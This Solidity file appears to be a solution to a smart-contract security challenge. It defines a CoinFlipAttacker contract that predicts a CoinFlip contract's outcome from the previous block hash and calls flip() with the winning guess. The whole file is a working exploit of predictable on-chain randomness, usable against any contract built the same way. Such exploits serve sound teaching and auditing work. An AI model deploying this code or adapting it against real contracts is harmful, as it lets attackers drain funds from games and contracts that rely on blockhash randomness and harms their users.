// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CoinFlipAttacker
 * @dev A contract to exploit the CoinFlip contract by predicting the outcome of the coin flip.
 * The CoinFlip contract uses the block hash of the previous block to determine the flip outcome,
 * which is predictable and can be exploited by this contract.
 */
contract CoinFlipAttacker {
    // Tracks the number of consecutive wins
    uint256 public consecutiveWins;

    // Stores the last block hash used to prevent duplicate calls in the same block
    uint256 private lastHash;

    // A constant factor used to calculate the coin flip outcome
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Interface to interact with the CoinFlip contract
    ICoinFlip public coinFlip;

    /**
     * @dev Constructor to initialize the CoinFlipAttacker contract.
     * @param _coinFlipAddress The address of the vulnerable CoinFlip contract.
     */
    constructor(address _coinFlipAddress) {
        // Initialize the CoinFlip interface with the provided address
        coinFlip = ICoinFlip(_coinFlipAddress);
    }

    /**
     * @dev Attacks the CoinFlip contract by predicting the outcome of the coin flip.
     * This function calculates the expected outcome using the same logic as the CoinFlip contract
     * and calls the `flip` function with the predicted value.
     * @notice This function must be called in separate transactions to avoid reverting due to the `lastHash` check.
     */
    function attack() public {
        // Get the block hash of the previous block
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Revert if the same block hash is used twice in a row
        if (lastHash == blockValue) {
            revert("Cannot call attack twice in the same block");
        }

        // Store the current block hash to prevent duplicate calls
        lastHash = blockValue;

        // Calculate the coin flip outcome using the same logic as the CoinFlip contract
        uint256 coinFlipResult = blockValue / FACTOR;
        bool guess = coinFlipResult == 1 ? true : false;

        // Call the `flip` function on the CoinFlip contract with the predicted outcome
        bool result = coinFlip.flip(guess);

        // Update the consecutive wins counter based on the result
        if (result) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                           COINFLIP INTERFACE
 //////////////////////////////////////////////////////////////*/

/**
 * @dev Interface for the CoinFlip contract.
 * This interface allows the CoinFlipAttacker contract to interact with the CoinFlip contract
 * without needing its full implementation.
 */
interface ICoinFlip {
    /**
     * @dev Flips the coin and checks if the guess matches the outcome.
     * @param _guess The player's guess (true for heads, false for tails).
     * @return A boolean indicating whether the guess was correct.
     */
    function flip(bool _guess) external returns (bool);
}
